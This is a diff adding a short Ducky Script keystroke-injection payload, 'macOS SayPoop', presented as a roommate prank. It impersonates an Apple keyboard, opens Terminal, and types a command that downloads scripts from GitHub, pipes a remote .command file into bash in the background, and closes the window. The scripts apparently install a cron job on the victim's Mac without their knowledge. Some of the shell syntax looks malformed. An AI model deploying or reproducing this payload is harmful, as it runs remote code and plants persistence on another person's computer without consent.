@@ -1,0 +1,19 @@
+REM Title:	macOS SayPoop
+REM Author:	FalsePhilosopher
+REM Description: Best way to prank your roommate
+REM Target:	OSX(untested)
+REM Version: 1.0
+REM Category: Prank
+ID 05ac:021e Apple:Keyboard
+DELAY 200
+COMMAND SPACE
+DELAY 300
+STRING terminal.app
+DELAY 300
+ENTER
+DELAY 1500
+STRING nohup curl -s https://github.com/AugieDoebling/SayPoop/raw/master/crontab.py https://github.com/AugieDoebling/SayPoop/raw/master/install_cron.py >\dev\null && curl -s -L https://github.com/AugieDoebling/SayPoop/raw/master/CLICK_TO_RUN.command | bash &
+DELAY 300
+ENTER
+DELAY 500
+ALT F4
